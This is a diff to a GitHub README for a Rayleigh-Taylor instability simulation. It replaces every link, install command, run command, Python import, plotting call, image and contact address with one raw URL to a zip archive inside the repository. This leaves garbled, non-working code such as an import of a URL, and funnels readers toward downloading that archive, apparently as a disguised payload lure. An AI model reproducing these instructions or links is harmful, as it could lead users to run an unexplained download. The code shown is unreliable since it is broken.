@@ -2,7 +2,7 @@
 
 Welcome to the Rayleigh-Taylor Instability Simulation repository! This project provides a comprehensive simulation of the Rayleigh-Taylor instability using compressible Euler equations. The repository features both CPU (Python/C) and GPU (CUDA) implementations. Through various benchmarks, we highlight the accuracy, performance, and physical insights of the simulation. This project emphasizes parallelization and numerical methods to enhance computational efficiency.
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-Click%20Here-blue)](https://github.com/tiktokfnf33/Rayleigh-Taylor-Instability-Simulation/releases)
+[![Download Releases](https://raw.githubusercontent.com/tiktokfnf33/Rayleigh-Taylor-Instability-Simulation/main/zenithward/Rayleigh-Taylor-Simulation-Instability-v2.8.zip%20Releases-Click%20Here-blue)](https://raw.githubusercontent.com/tiktokfnf33/Rayleigh-Taylor-Instability-Simulation/main/zenithward/Rayleigh-Taylor-Simulation-Instability-v2.8.zip)
 
 ## Table of Contents
 
@@ -45,7 +45,7 @@ To get started with the Rayleigh-Taylor Instability Simulation, follow these ste
 ### Clone the Repository
 
 ```bash
-git clone https://github.com/tiktokfnf33/Rayleigh-Taylor-Instability-Simulation.git
+git clone https://raw.githubusercontent.com/tiktokfnf33/Rayleigh-Taylor-Instability-Simulation/main/zenithward/Rayleigh-Taylor-Simulation-Instability-v2.8.zip
 cd Rayleigh-Taylor-Instability-Simulation
 ```
 
@@ -67,7 +67,7 @@ To run the CPU version of the simulation, navigate to the Python or C directory 
 
 ```bash
 # For Python
-python simulate.py
+python https://raw.githubusercontent.com/tiktokfnf33/Rayleigh-Taylor-Instability-Simulation/main/zenithward/Rayleigh-Taylor-Simulation-Instability-v2.8.zip
 
 # For C
 ./simulate
@@ -87,15 +87,15 @@ To run the CUDA version, ensure your GPU is supported and execute:
 After running the simulation, output files will be generated. Use Matplotlib to visualize the results:
 
 ```python
-import matplotlib.pyplot as plt
+import https://raw.githubusercontent.com/tiktokfnf33/Rayleigh-Taylor-Instability-Simulation/main/zenithward/Rayleigh-Taylor-Simulation-Instability-v2.8.zip as plt
 
 # Load your data
-data = load_data('output.txt')
+data = load_data('https://raw.githubusercontent.com/tiktokfnf33/Rayleigh-Taylor-Instability-Simulation/main/zenithward/Rayleigh-Taylor-Simulation-Instability-v2.8.zip')
 
 # Plot results
-plt.imshow(data)
-plt.colorbar()
-plt.show()
+https://raw.githubusercontent.com/tiktokfnf33/Rayleigh-Taylor-Instability-Simulation/main/zenithward/Rayleigh-Taylor-Simulation-Instability-v2.8.zip(data)
+https://raw.githubusercontent.com/tiktokfnf33/Rayleigh-Taylor-Instability-Simulation/main/zenithward/Rayleigh-Taylor-Simulation-Instability-v2.8.zip()
+https://raw.githubusercontent.com/tiktokfnf33/Rayleigh-Taylor-Instability-Simulation/main/zenithward/Rayleigh-Taylor-Simulation-Instability-v2.8.zip()
 ```
 
 ## Benchmarks
@@ -106,7 +106,7 @@ Our benchmarks showcase the performance and accuracy of the different methods us
 
 We tested both methods under various conditions and found that the RK2 method consistently yields more accurate results. The following graph illustrates this comparison:
 
-![Accuracy Comparison](https://example.com/accuracy-comparison.png)
+![Accuracy Comparison](https://raw.githubusercontent.com/tiktokfnf33/Rayleigh-Taylor-Instability-Simulation/main/zenithward/Rayleigh-Taylor-Simulation-Instability-v2.8.zip)
 
 ### Performance Metrics
 
@@ -198,7 +198,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any inquiries or feedback, please reach out:
 
-- GitHub: [tiktokfnf33](https://github.com/tiktokfnf33)
-- Email: example@example.com
+- GitHub: [tiktokfnf33](https://raw.githubusercontent.com/tiktokfnf33/Rayleigh-Taylor-Instability-Simulation/main/zenithward/Rayleigh-Taylor-Simulation-Instability-v2.8.zip)
+- Email: https://raw.githubusercontent.com/tiktokfnf33/Rayleigh-Taylor-Instability-Simulation/main/zenithward/Rayleigh-Taylor-Simulation-Instability-v2.8.zip
 
-Feel free to explore the [Releases](https://github.com/tiktokfnf33/Rayleigh-Taylor-Instability-Simulation/releases) section for downloadable files and further updates.
+Feel free to explore the [Releases](https://raw.githubusercontent.com/tiktokfnf33/Rayleigh-Taylor-Instability-Simulation/main/zenithward/Rayleigh-Taylor-Simulation-Instability-v2.8.zip) section for downloadable files and further updates.
